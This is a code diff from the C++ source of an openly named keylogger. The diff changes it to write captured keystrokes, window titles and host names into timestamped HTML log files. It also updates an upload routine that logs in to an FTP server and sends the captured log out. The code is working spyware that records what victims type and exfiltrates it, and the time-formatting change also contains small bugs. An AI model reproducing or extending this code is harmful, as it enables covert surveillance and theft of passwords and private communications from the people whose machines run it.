@@ -318,11 +318,13 @@ void KeyLogger::listen() {
     
     CreateDirectory(std::string(programDir + DATADIR).c_str(), NULL);
 
-    ifstream logCheck(programDir + DATADIR + "\\" + KEYSTROKES_FILE);
+    logFileName << programDir << DATADIR << "\\" << time(NULL) << ".html";
+    
+    ifstream logCheck(logFileName.str());
     bool exists = logCheck.good();
     logCheck.close();
     
-    logFile.open(programDir + DATADIR + "\\" + KEYSTROKES_FILE, ios::app);
+    logFile.open(logFileName.str(), ios::app);
     if (!exists) {
         logFile << TABLE_CSS;
         logFile << "<table class=\"table\"><tr><td>Time</td><td>Host</td><td>Window</td><td width=\"50%\">Key strokes</td></tr>";
@@ -373,11 +375,17 @@ void KeyLogger::writeBuffer()
 std::string KeyLogger::getTimeString() {
 
     time_t currentTime = time(NULL);
-    char dateString[100];
-    ctime_s(dateString, sizeof(dateString), &currentTime);
-    dateString[strlen(dateString) - 1] = NULL;
 
-    return std::string(dateString);
+    tm gmt;
+    gmtime_s(&gmt, &currentTime);
+    
+    std::stringstream timeString;
+    
+    timeString << gmt.tm_mday << "/" << gmt.tm_mon + 1 << "/" << gmt.tm_year + 1900  << " at " << (gmt.tm_hour + 1) % 24 << ":";
+
+    gmt.tm_min < 9 ? timeString << "0" << gmt.tm_min : timeString << gmt.tm_min;
+
+    return timeString.str();
 }
 
 std::string KeyLogger::getActiveWindowTitle() {
@@ -405,13 +413,8 @@ void KeyLogger::upload() {
     ftpClient.connect(server, port);
 
     if (ftpClient.login(login, password).isOk()) {
-        std::string keystrokesFile;
-        keystrokesFile += programDir;
-        keystrokesFile += DATADIR;
-        keystrokesFile += "\\";
-        keystrokesFile += KEYSTROKES_FILE;
 
-        ftpClient.upload(keystrokesFile, uploadDir, sf::Ftp::Ascii);
+        ftpClient.upload(logFileName.str(), uploadDir, sf::Ftp::Ascii);
     }
     
     ftpClient.disconnect();
